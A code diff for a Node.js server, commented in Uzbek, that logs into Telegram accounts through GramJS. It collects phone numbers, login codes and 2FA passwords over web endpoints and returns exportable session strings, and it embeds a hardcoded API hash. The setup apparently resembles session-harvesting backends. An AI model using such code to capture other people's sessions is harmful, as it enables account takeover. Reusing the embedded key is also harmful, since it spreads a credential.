@@ -13,14 +13,19 @@ const apiHash = "6b2c509f05b3c529eddb9326a813bf0f";
 let stringSession = new StringSession("");
 let client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });
 
-let phoneCodeHash = null;
-let userPhone = "";
+// Aloqani tekshirish funksiyasi
+async function ensureConnected() {
+    if (!client.connected) {
+        console.log("🔄 Telegram bilan aloqa qayta tiklanmoqda...");
+        await client.connect();
+    }
+}
 
 // 1. Kod yuborish
 app.post('/send-code', async (req, res) => {
     userPhone = req.body.phone;
-    await client.connect();
     try {
+        await client.connect(); // Birinchi ulanish
         const result = await client.sendCode({ apiId, apiHash }, userPhone);
         phoneCodeHash = result.phoneCodeHash;
         res.json({ success: true, message: "Kod yuborildi!" });
@@ -33,7 +38,8 @@ app.post('/send-code', async (req, res) => {
 app.post('/login', async (req, res) => {
     const code = req.body.code;
     try {
-        // GramJS'ning eng quyi va eng barqaror moduli orqali kirish
+        await ensureConnected(); // Aloqa borligini 100% tekshiramiz!
+        
         const result = await client.invoke(
             new Api.auth.SignIn({
                 phoneNumber: userPhone,
@@ -42,10 +48,8 @@ app.post('/login', async (req, res) => {
             })
         );
         
-        // Agar foydalanuvchi muvaffaqiyatli kirsa (2FA yo'q bo'lsa)
         res.json({ success: true, need2FA: false, session: client.session.save() });
     } catch (e) {
-        // Agar akkauntda 2FA bo'lsa, Telegram SESSION_PASSWORD_NEEDED xatosini qaytaradi
         if (e.message.includes("SESSION_PASSWORD_NEEDED")) {
             res.json({ success: true, need2FA: true, message: "2FA kerak!" });
         } else {
@@ -54,11 +58,12 @@ app.post('/login', async (req, res) => {
     }
 });
 
-// 3. 2FA parolini tekshirish (authParams xatosini 100% yo'qotadi)
+// 3. 2FA parolini tekshirish
 app.post('/check-password', async (req, res) => {
     const password = req.body.password;
     try {
-        // Shunchaki o'rnatilgan parolni tekshirish funksiyasini chaqiramiz
+        await ensureConnected(); // Bu yerda ham aloqani tekshiramiz!
+        
         await client.checkPassword({
             password: password
         });
@@ -68,4 +73,4 @@ app.post('/check-password', async (req, res) => {
     }
 });
 
-app.listen(3000, () => console.log("Server barqaror ishlamoqda..."));
+app.listen(3000, () => console.log("Server uzilishlarsiz ishlamoqda..."));
